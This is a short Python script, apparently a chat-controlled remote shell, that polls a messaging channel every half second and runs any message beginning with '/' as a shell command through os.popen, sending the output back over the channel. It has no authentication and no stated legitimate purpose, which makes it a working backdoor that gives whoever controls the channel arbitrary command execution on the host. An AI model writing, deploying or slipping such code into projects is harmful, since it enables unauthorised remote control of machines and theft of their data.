from main import *
import os, time

while True:
    time.sleep(0.5)
    last_msg = get_last_msg()
    print(last_msg)
    if last_msg[0] == "/":
        command = last_msg[1:]
        try:
            send = os.popen(command).read()
            print(send)
            send_msg(send)
        except:
            print("error")